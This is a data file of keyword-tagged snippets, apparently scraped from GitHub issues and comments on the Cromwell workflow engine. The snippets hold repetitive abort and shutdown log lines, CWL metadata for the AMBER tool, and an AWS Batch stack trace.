Safety,":06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:51,499 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:25:56,518 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:01,538 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:06,559 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:11,579 cromwell-system-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:4019,Abort,Abort,4019,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,":06.270Z"",; ""cromwellVersion"": ""52""; },; {; ""cromwellId"": ""cromid-0fe86cb"",; ""description"": ""PickedUp"",; ""timestamp"": ""2020-09-02T09:23:04.924Z"",; ""cromwellVersion"": ""52""; }; ],; ""metadataSource"": ""Unarchived"",; ""actualWorkflowLanguageVersion"": ""v1.0"",; ""submittedFiles"": {; ""workflow"": ""{\n \""$graph\"": [\n {\n \""class\"": \""CommandLineTool\"",\n \""doc\"": \""AMBER is designed to generate a tumor BAF file for use in PURPLE from a provided VCF of likely heterozygous SNP sites.\\n\\nWhen using paired reference/tumor bams,\\nAMBER confirms these sites as heterozygous in the reference sample bam then calculates the\\nallelic frequency of corresponding sites in the tumor bam.\\nIn tumor only mode, all provided sites are examined in the tumor with additional filtering then applied.\\n\\nThe Bioconductor copy number package is then used to generate pcf segments from the BAF file.\\n\\nWhen using paired reference/tumor data, AMBER is also able to:\\n1. detect evidence of contamination in the tumor from homozygous sites in the reference; and\\n2. facilitate sample matching by recording SNPs in the germline\\n\"",\n \""requirements\"": [\n {\n \""dockerPull\"": \""quay.io/biocontainers/hmftools-amber:3.3--0\"",\n \""class\"": \""DockerRequirement\""\n },\n {\n \""expressionLib\"": [\n \""var get_start_memory = function(){ /* Start with 2 Gb */ return 2000; }\"",\n \""var get_max_memory_from_runtime_memory = function(max_ram){ /* Get Max memory and subtract heap memory */ return max_ram - get_start_memory(); }\""\n ],\n \""class\"": \""InlineJavascriptRequirement\""\n },\n {\n \""coresMin\"": 16,\n \""ramMin\"": 32000,\n \""class\"": \""ResourceRequirement\""\n },\n {\n \""class\"": \""ShellCommandRequirement\""\n }\n ],\n \""baseCommand\"": [\n \""AMBER\""\n ],\n \""arguments\"": [\n {\n \""prefix\"": \""-Xms\"",\n \""separate\"": false,\n \""valueFrom\"": \""$(get_start_memory())m\"",\n \""position\"": -2\n },\n {\n \""prefix\"": \""-Xmx\"",\n \""separate\"": false,\n \""valueFrom\"": \""$(get_max_memory_from_runtime_memory(runtime.ram))m\",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:61826,detect,detect,61826,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['detect'],['detect']
Safety,":24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:2499,Abort,Abort,2499,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,":26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:51,499 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:25:56,518 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:01,538 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:06,559 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:11,579 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:16,599 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:21,618 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:26,639 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:31,658 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:4627,Abort,Abort,4627,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,":31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:51,499 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:25:56,518 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:01,538 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:06,559 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:11,579 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:16,599 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:21,618 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:26,639 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:31,658 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:36,678 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:4779,Abort,Abort,4779,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,":36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:51,499 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:25:56,518 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:01,538 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:06,559 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:11,579 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:16,599 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:21,618 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:26,639 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:31,658 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:36,678 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:41,699 cromwell-system-ak",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:4931,Abort,Abort,4931,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,":41,459 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:51,499 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:25:56,518 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:01,538 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:06,559 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:11,579 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:16,599 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:21,618 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:26,639 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:31,658 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:36,678 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:41,699 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:46,719 cromwell-system-ak",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:5083,Abort,Abort,5083,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,":45,978 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:50,999 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:23:56,019 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akk",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:1589,Abort,Abort,1589,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,":50,999 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:23:56,019 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:1741,Abort,Abort,1741,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,":51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:51,499 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:25:56,518 cromwell-system-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:3563,Abort,Abort,3563,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,":55:17,31] [info] Aborting all running workflows.; [2023-02-04 08:55:17,31] [info] JobExecutionTokenDispenser stopped; [2023-02-04 08:55:17,31] [info] WorkflowStoreActor stopped; [2023-02-04 08:55:17,32] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2023-02-04 08:55:17,32] [info] WorkflowLogCopyRouter stopped; [2023-02-04 08:55:17,32] [info] WorkflowManagerActor All workflows finished; [2023-02-04 08:55:17,32] [info] WorkflowManagerActor stopped; [2023-02-04 08:55:17,32] [info] Connection pools shut down; [2023-02-04 08:55:17,33] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2023-02-04 08:55:17,33] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2023-02-04 08:55:17,33] [info] SubWorkflowStoreActor stopped; [2023-02-04 08:55:17,33] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2023-02-04 08:55:17,33] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2023-02-04 08:55:17,33] [info] JobStoreActor stopped; [2023-02-04 08:55:17,33] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2023-02-04 08:55:17,33] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2023-02-04 08:55:17,33] [info] CallCacheWriteActor stopped; [2023-02-04 08:55:17,33] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2023-02-04 08:55:17,33] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2023-02-04 08:55:17,33] [info] KvWriteActor Shutting down: 0 queued messages to process; [2023-02-04 08:55:17,33] [info] DockerHashActor stopped; [2023-02-04 08:55:17,34] [info] IoProxy stopped; [2023-02-04 08:55:17,34] [info] ServiceRegistryActor stopped; [2023-02-04 08:55:17,37] [info] Database closed; [2023-02-04 08:55:17,37] [info] Stream materializer shut down; [2023-02-04 08:55:17,40] [info] Automatic shutdown of the async connection; [2023-02-04 08:55:17,40] [info] Gracefully shutdown sentry threads.; [2023-02-04 08:55:17,40] [info] Shutdown finish",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6999:16512,Timeout,Timeout,16512,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6999,7,['Timeout'],['Timeout']
Safety,:; ```; ERROR - AwsBatchAsyncBackendJobExecutionActor [UUID(4057b0c6)generate_10gb_file.generate_file:NA:1]: Error attempting to Recover(StandardAsyncJob(4704e5c9-3a79-4280-a464-d737f36056ec)); java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:628); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:627); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.execute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:653); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recoverAsync(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:949); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:944); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.executeOrRecover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRec,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4857:1218,recover,recover,1218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4857,1,['recover'],['recover']
